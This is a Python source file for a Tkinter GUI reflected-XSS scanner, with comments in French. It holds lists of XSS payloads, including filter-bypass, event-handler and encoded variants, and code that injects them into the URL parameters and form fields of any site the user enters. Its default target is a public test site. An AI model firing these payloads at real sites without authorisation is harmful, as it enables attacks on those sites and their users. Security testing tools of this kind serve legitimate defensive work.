import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import re
from typing import List, Dict, Tuple, Set
import time


class XSSPayloads:
    """Collection de payloads XSS pour différents contextes"""

    BASIC = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'>",
    ]

    BYPASS_FILTERS = [
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert`XSS`>",
        "<svg/onload=alert('XSS')>",
        "<<script>alert('XSS')</script>",
        "<script>alert('XSS');//",
        "<script>alert('XSS');</script>",
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "</script><script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
    ]

    EVENT_HANDLERS = [
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror='alert(\"XSS\")'>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ]

    ATTRIBUTE_BASED = [
        "' autofocus onfocus=alert('XSS') x='",
        "\" autofocus onfocus=alert('XSS') x=\"",
        "' onmouseover='alert(\"XSS\")",
        "\" onmouseover=\"alert('XSS')",
    ]

    ENCODED = [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<img src=x onerror=\u0061\u006C\u0065\u0072\u0074('XSS')>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    ]

    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Retourne tous les payloads disponibles"""
        return (cls.BASIC + cls.BYPASS_FILTERS + cls.EVENT_HANDLERS +
                cls.ATTRIBUTE_BASED + cls.ENCODED)

    @classmethod
    def get_basic_payloads(cls) -> List[str]:
        """Retourne seulement les payloads basiques"""
        return cls.BASIC


class XSSScanner:
    """Scanner XSS pour détecter les vulnérabilités Reflected XSS"""

    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable_params: List[Dict] = []

    def scan_url(self, url: str, payloads: List[str], test_forms: bool = True) -> None:
        """Scan une URL pour des vulnérabilités XSS"""
        self.log(f"[*] Scanning {url}")
        self.log(f"[*] Using {len(payloads)} payloads")

        # Test des paramètres GET
        self._test_get_params(url, payloads)

        # Test des formulaires si activé
        if test_forms:
            self._test_forms(url, payloads)

    def _test_get_params(self, url: str, payloads: List[str]) -> None:
        """Test les paramètres GET pour XSS"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            self.log("[*] No GET parameters found")
            return

        self.log(f"[*] Testing {len(params)} GET parameters")

        for param_name in params.keys():
            self.log(f"[*] Testing parameter: {param_name}")

            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                # Reconstruction de l'URL
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                try:
                    response = self.session.get(test_url, timeout=10, allow_redirects=True)

                    # Vérification si le payload est reflété dans la réponse
                    if self._is_vulnerable(response.text, payload):
                        vuln = {
                            'url': url,
                            'parameter': param_name,
                            'method': 'GET',
                            'payload': payload,
                            'type': 'Reflected XSS'
                        }
                        self.vulnerable_params.append(vuln)
                        self.log(f"[!] VULNERABLE: {param_name} with payload: {payload[:50]}")
                        break  # Un payload suffit par paramètre

                except requests.RequestException as e:
                    self.log(f"[-] Error testing {param_name}: {str(e)}")

                time.sleep(0.1)  # Rate limiting

    def _test_forms(self, url: str, payloads: List[str]) -> None:
        """Test les formulaires HTML pour XSS"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                self.log("[*] No forms found")
                return

            self.log(f"[*] Found {len(forms)} form(s)")

            for idx, form in enumerate(forms):
                self._test_single_form(url, form, payloads, idx)

        except requests.RequestException as e:
            self.log(f"[-] Error fetching forms: {str(e)}")

    def _test_single_form(self, base_url: str, form, payloads: List[str], form_idx: int) -> None:
        """Test un formulaire spécifique"""
        action = form.get('action', '')
        method = form.get('method', 'get').upper()
        form_url = urljoin(base_url, action)

        self.log(f"[*] Testing form #{form_idx + 1} - {method} {form_url}")

        # Extraction des inputs
        inputs = form.find_all(['input', 'textarea', 'select'])
        form_data = {}

        for input_tag in inputs:
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')

            if input_name and input_type not in ['submit', 'button', 'image']:
                form_data[input_name] = input_tag.get('value', 'test')

        if not form_data:
            self.log(f"[-] Form #{form_idx + 1} has no testable inputs")
            return

        # Test chaque input avec les payloads
        for input_name in form_data.keys():
            self.log(f"[*] Testing form input: {input_name}")

            for payload in payloads[:10]:  # Limite pour les formulaires
                test_data = form_data.copy()
                test_data[input_name] = payload

                try:
                    if method == 'POST':
                        response = self.session.post(form_url, data=test_data, timeout=10)
                    else:
                        response = self.session.get(form_url, params=test_data, timeout=10)

                    if self._is_vulnerable(response.text, payload):
                        vuln = {
                            'url': form_url,
                            'parameter': input_name,
                            'method': method,
                            'payload': payload,
                            'type': 'Reflected XSS (Form)'
                        }
                        self.vulnerable_params.append(vuln)
                        self.log(f"[!] VULNERABLE: Form input '{input_name}' with payload: {payload[:50]}")
                        break

                except requests.RequestException as e:
                    self.log(f"[-] Error testing form: {str(e)}")

                time.sleep(0.1)

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        """Vérifie si le payload est présent dans la réponse (vulnérable)"""
        # Recherche exacte
        if payload in response_text:
            return True

        # Recherche avec variations d'encodage
        escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        if escaped_payload not in response_text:
            # Si le payload est échappé, potentiellement sécurisé
            return False

        return False

    def get_results(self) -> List[Dict]:
        """Retourne les vulnérabilités trouvées"""
        return self.vulnerable_params


class XSSModule(tk.Frame):
    """Module GUI pour les tests XSS"""

    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)

        self.scanner = None
        self.scan_thread = None

        # Configuration
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", pady=5)

        # URL Target
        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.url_entry = ttk.Entry(config_frame, width=60)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/search.php?test=query")
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        config_frame.columnconfigure(1, weight=1)

        # Options
        options_frame = tk.Frame(self, bg="#1e1e1e")
        options_frame.pack(fill="x", pady=5)

        ttk.Label(options_frame, text="Payload Set:").pack(side="left", padx=5)
        self.payload_var = tk.StringVar(value="basic")
        ttk.Radiobutton(options_frame, text="Basic (5)", variable=self.payload_var,
                        value="basic").pack(side="left")
        ttk.Radiobutton(options_frame, text="All (30+)", variable=self.payload_var,
                        value="all").pack(side="left")

        self.test_forms_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Test Forms",
                        variable=self.test_forms_var).pack(side="left", padx=20)

        # Boutons
        button_frame = tk.Frame(self, bg="#1e1e1e")
        button_frame.pack(fill="x", pady=5)

        ttk.Button(button_frame, text="Start Scan",
                   command=self.start_scan).pack(side="left", padx=5)
        ttk.Button(button_frame, text="Clear Results",
                   command=self.clear_output).pack(side="left", padx=5)

        # Zone de résultats
        results_label = ttk.Label(self, text="Scan Results:")
        results_label.pack(anchor="w", pady=(10, 0))

        self.output = scrolledtext.ScrolledText(
            self, bg="#252526", fg="white", height=20, wrap=tk.WORD
        )
        self.output.pack(fill="both", expand=True, pady=5)

        # Configuration des tags pour coloration
        self.output.tag_config("vulnerable", foreground="#ff6b6b")
        self.output.tag_config("info", foreground="#4dabf7")
        self.output.tag_config("success", foreground="#51cf66")

    def log(self, msg: str) -> None:
        """Log un message dans l'interface"""
        def _log():
            # Détection du type de message pour coloration
            if msg.startswith("[!]"):
                tag = "vulnerable"
            elif msg.startswith("[+]"):
                tag = "success"
            elif msg.startswith("[*]"):
                tag = "info"
            else:
                tag = None

            self.output.insert("end", msg + "\n", tag)
            self.output.see("end")

        # Utiliser after pour thread-safety
        self.after(0, _log)

    def start_scan(self) -> None:
        """Démarre le scan XSS"""
        url = self.url_entry.get().strip()

        if not url:
            self.log("[!] Please enter a target URL")
            return

        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, url)

        # Sélection des payloads
        if self.payload_var.get() == "basic":
            payloads = XSSPayloads.get_basic_payloads()
        else:
            payloads = XSSPayloads.get_all_payloads()

        test_forms = self.test_forms_var.get()

        self.log("=" * 60)
        self.log("[+] XSS Scanner Started")
        self.log(f"[*] Target: {url}")
        self.log(f"[*] Payloads: {len(payloads)}")
        self.log(f"[*] Test Forms: {'Yes' if test_forms else 'No'}")
        self.log("=" * 60)

        # Lancer le scan dans un thread séparé
        self.scan_thread = threading.Thread(
            target=self._run_scan,
            args=(url, payloads, test_forms),
            daemon=True
        )
        self.scan_thread.start()

    def _run_scan(self, url: str, payloads: List[str], test_forms: bool) -> None:
        """Exécute le scan dans un thread séparé"""
        try:
            self.scanner = XSSScanner(self.log)
            self.scanner.scan_url(url, payloads, test_forms)

            # Afficher le résumé
            results = self.scanner.get_results()
            self.log("=" * 60)
            self.log(f"[+] Scan Complete!")
            self.log(f"[*] Vulnerabilities Found: {len(results)}")

            if results:
                self.log("\n[!] VULNERABLE PARAMETERS:")
                for idx, vuln in enumerate(results, 1):
                    self.log(f"\n--- Vulnerability #{idx} ---")
                    self.log(f"Type: {vuln['type']}")
                    self.log(f"URL: {vuln['url']}")
                    self.log(f"Parameter: {vuln['parameter']}")
                    self.log(f"Method: {vuln['method']}")
                    self.log(f"Payload: {vuln['payload']}")
            else:
                self.log("[+] No vulnerabilities detected")

            self.log("=" * 60)

        except Exception as e:
            self.log(f"[-] Error during scan: {str(e)}")

    def clear_output(self) -> None:
        """Efface la zone de résultats"""
        self.output.delete(1.0, tk.END)


if __name__ == "__main__":
    # Test standalone
    root = tk.Tk()
    root.title("XSS Scanner Module")
    root.geometry("900x600")
    root.configure(bg="#1e1e1e")

    style = ttk.Style(root)
    style.theme_use("clam")
    style.configure("TButton", background="#3c3c3c", foreground="white", padding=6)
    style.configure("TLabel", background="#1e1e1e", foreground="white")

    XSSModule(root)
    root.mainloop()